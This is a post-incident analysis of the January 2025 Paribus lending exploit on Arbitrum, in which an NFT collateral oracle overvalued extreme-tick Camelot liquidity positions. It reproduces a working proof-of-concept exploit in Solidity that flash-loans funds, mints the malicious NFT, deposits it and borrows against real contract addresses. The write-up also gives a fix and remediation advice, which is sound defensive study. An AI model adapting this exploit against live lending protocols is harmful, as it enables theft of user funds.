# Paribus — Concentrated Liquidity NFT Collateral Overvaluation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-22 |
| **Protocol** | Paribus |
| **Chain** | Arbitrum |
| **Loss** | ~$86,000 |
| **Attacker** | [0x5619...e7Ed](https://arbiscan.io/address/0x56190CAC88b8D4b5D5Ed668ef81828913932e7Ed) |
| **Attack Tx** | [0xf5e7...bd2](https://arbiscan.io/tx/0xf5e753d3da60db214f2261343c1e1bc46e674d2fa4b7a953eaf3c52123aeebd2) |
| **Vulnerable Contract** | Paribus lending contract (Arbitrum) |
| **Root Cause** | Collateral valuation logic overestimates the actual value of concentrated liquidity NFTs with extreme tick ranges (-870000~870000), allowing over-borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol) |

---

## 1. Vulnerability Overview

Paribus is a protocol that allows Uniswap V3 concentrated liquidity NFT positions to be used as collateral. The attacker flash-borrowed approximately 3,093,209 USDT from Aave, swapped it into PBX tokens, and then minted a Camelot concentrated liquidity NFT with the tick range set to its maximum values (-870000~870000). Although this extreme tick range represents liquidity that is never actually active, Paribus's collateral valuation logic calculated it as having enormous value, allowing the attacker to borrow multiple assets (pETH, pARB, pWBTC, pUSDT).

## 2. Vulnerable Code Analysis

Source: **Sourcify-verified** — PNFTTokenDelegator / 0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26 (Arbitrum)
Sourcify URL: https://sourcify.dev/server/files/any/42161/0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26

The PNFTTokenDelegator (ERC-721 collateral token) is verified on Sourcify. When an NFT is deposited as collateral via `mint(tokenId)`, the contract calls `comptroller.mintNFTAllowed()` and then `comptroller.nftLiquidateCalculateValues()` / `getUnderlyingNFTPrice()` to price the position. The oracle (`IOracleNFT.getUnderlyingNFTPrice`) computes value from the raw liquidity and the token prices — without validating the tick range of the Camelot concentrated liquidity position.

```solidity
// Sourcify-verified: PNFTToken.sol — mintInternal (the entry point for NFT collateral deposit)
function mintInternal(address minter, uint tokenId) internal nonReentrant returns (Error) {
    require(!_exists(tokenId), "token already minted");

    Error allowed = comptroller.mintNFTAllowed(address(this), minter, tokenId); // ← checks if minting is allowed
    if (allowed != Error.NO_ERROR) {
        return fail(allowed);
    }
    // ❌ No validation of the NFT's tick range or active liquidity here.
    // Any tokenId (including positions with tickLower=-870000, tickUpper=870000) is accepted.

    uint accountTokensNew = add_(accountTokens[minter], 1);

    doTransferIn(minter, tokenId); // ← transfers NFT from minter to contract

    _addTokenToOwnerEnumeration(minter, tokenId);
    _addTokenToAllTokensEnumeration(tokenId);

    accountTokens[minter] = accountTokensNew;
    tokensOwners[tokenId] = minter;

    emit Mint(minter, tokenId);
    emit Transfer(address(0), minter, tokenId);

    comptroller.mintNFTVerify(address(this), minter, tokenId); // ← post-mint hook

    return Error.NO_ERROR;
}
```

The price oracle interface (PriceOracleInterfaces.sol, also Sourcify-verified):

```solidity
// IOracleNFT — called by the Comptroller to value the deposited NFT position
contract IOracleNFT {
    // ❌ getUnderlyingNFTPrice accepts any tokenId and computes value
    // from raw liquidity and token prices, without checking whether the
    // position's tick range is active (i.e., whether current price falls within [tickLower, tickUpper]).
    function getUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external view returns (uint); // ❌ no tick range validation
    function getOrRequestUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external returns (uint);
}
```

**Why it is exploitable (identify the bug from the code):**
- The PoC mints a Camelot concentrated liquidity NFT with `tickLower = -870_000` (minimum) and `tickUpper = 870_000` (maximum), depositing 789,722,754,473,453,300,405,586,192 PBX + 500,000,000,000 USDT worth of tokens into the range.
- Because the tick range spans the entire possible price space, the actual active liquidity at any real market price is near zero — the position's real value is negligible.
- However, Paribus's oracle (`getUnderlyingNFTPrice`) computed the position value from the raw liquidity figure and USD prices without checking if `currentTick` falls inside `[tickLower, tickUpper]`.
- The inflated valuation allowed the attacker to borrow 12.6 ETH, 6,510 ARB, 0.367 WBTC, and 3,924 USDT against an essentially worthless NFT.

```solidity
// ✅ Fix: validate tick range and active liquidity in the NFT price oracle
function getUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external view returns (uint) {
    (,, address token0, address token1,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,)
        = positionManager.positions(tokenId);
    int24 currentTick = IUniswapV3Pool(getPool(token0, token1)).slot0().tick; // ✅ get current price tick
    require(tickLower <= currentTick && currentTick <= tickUpper, "Position not active"); // ✅ reject inactive ranges
    uint256 rangeWidth = uint256(int256(tickUpper - tickLower));
    require(rangeWidth <= MAX_ACCEPTED_TICK_RANGE, "Tick range too wide"); // ✅ cap extreme ranges
    return _computeValueFromLiquidity(token0, token1, liquidity, tickLower, tickUpper);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan 3,093,209 USDT from Aave
  │
  ├─→ [2] Swap USDT → PBX via Camelot Router
  │
  ├─→ [3] Mint concentrated liquidity NFT with extreme tick range
  │         ├─ tickLower: -870,000 (minimum value)
  │         └─ tickUpper: +870,000 (maximum value)
  │         └─ Actual active liquidity: nearly none
  │
  ├─→ [4] Enter Paribus market with NFT (register as collateral)
  │         └─ Paribus: evaluates NFT value far higher than actual
  │
  ├─→ [5] Borrow multiple assets using overvalued collateral
  │         ├─ Borrow large amount of pETH
  │         ├─ Borrow large amount of pARB
  │         ├─ Borrow large amount of pWBTC
  │         └─ Borrow large amount of pUSDT
  │
  ├─→ [6] Convert borrowed assets → USDT
  │
  ├─→ [7] Repay Aave flash loan
  │
  └─→ [8] ~$86,000 profit
```

## 4. PoC Code (DeFiHackLabs — Paribus_exp.sol)

```solidity
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol
// Fork block: 296,699,666 (Arbitrum)

contract ParibusExploit is BaseTestWithBalanceLog {
    IAaveFlashloan private constant Aave = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    CamelotRouter CamelotRouterV3 = CamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
    NFTPositionManager CamelotNFTPositionManager = NFTPositionManager(0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15);
    ControllerNFT ComptrollerNFT = ControllerNFT(0x712E2B12D75fe092838A3D2ad14B6fF73d3fdbc9);
    NFTPositionManager PNFTTokenDelegator = NFTPositionManager(0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 PBX  = IERC20(0xbAD58ed9b5f26A002ea250D7A60dC6729a4a2403);
    PBXToken pETH  = PBXToken(0xAffd437801434643B734D0B2853654876F66f7D7);
    PBXToken pARB  = PBXToken(0xFc2737a742A741d13fE6326011a78cd881dE3Eb9);
    PBXToken pWBTC = PBXToken(0x1c762E00f1D9317a4214d22b2576995C427F61c9);
    PBXToken pUSDT = PBXToken(0xFB1dcFc67cC496Eb0cC592050AF7Fdf3bF3b5C13);

    function testExploit() public {
        Aave.flashLoanSimple(address(this), address(USDT), 3093209807085, bytes(""), 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external returns (bool)
    {
        // [1] Swap 1,000,000 USDT → PBX via Camelot V3
        CamelotRouterV3.exactInputSingle(CamelotRouter.ExactInputSingleParams(
            address(USDT), address(PBX), address(this), 1737200705, 1000000000000, 0, 0
        ));

        // [2] Mint concentrated liquidity NFT with extreme tick range
        CamelotNFTPositionManager.mint(NFTPositionManager.MintParams(
            address(PBX),
            address(USDT),
            -870000,   // ❌ extreme minimum tick — position is inactive at any real price
            870000,    // ❌ extreme maximum tick
            789722754473453300405586192, // enormous PBX amount
            500000000000,
            0, 0,
            address(this),
            1737200720
        ));
        // tokenId = 224023

        // [3] Approve NFT and deposit into Paribus as collateral
        CamelotNFTPositionManager.approve(address(PNFTTokenDelegator), 224023);
        address[] memory markets = new address[](1);
        markets[0] = address(PNFTTokenDelegator);
        ComptrollerNFT.enterNFTMarkets(markets);
        PNFTTokenDelegator.mint(224023); // ❌ Paribus prices the extreme-tick NFT at inflated value

        // [4] Borrow multiple assets against the overvalued NFT collateral
        pETH.borrow(12599960598441767978);   // 12.6 ETH
        pARB.borrow(6510273280264926258675); // 6,510 ARB
        pWBTC.borrow(36729789);              // 0.367 WBTC
        pUSDT.borrow(3924210566);            // 3,924 USDT

        // [5] Sell PBX → USDT and WBTC → USDT, then repay Aave flash loan
        USDT.approve(address(Aave), type(uint256).max);
        return true;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Collateral Mispricing (NFT Collateral Overvaluation) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash loan + manipulated NFT collateral) |
| **DApp Category** | Lending / NFT collateral protocol |
| **Impact** | ~$86,000 drained via over-borrowing |

## 6. Remediation Recommendations

1. **Tick Range Restriction**: Set a maximum allowable tick range and reject NFTs that exceed it as collateral
2. **Active Liquidity Validation**: Only accept positions as collateral when the current price falls within the tick range
3. **Conservative NFT Collateral Valuation**: Apply lower LTV ratios as the tick range widens
4. **Use Independent Price Feeds**: Verify NFT position value using a trusted oracle rather than the protocol's own calculation

## 7. Lessons Learned

- The collateral value of Uniswap V3 concentrated liquidity NFTs varies drastically depending on tick range and current price; they must not be evaluated based solely on raw liquidity figures.
- Designs that permit extreme parameter values (e.g., maximum tick range) are highly susceptible to exploitation by attackers.
- When integrating complex DeFi primitives (NFT collateral, concentrated liquidity), edge cases of each component must be thoroughly analyzed.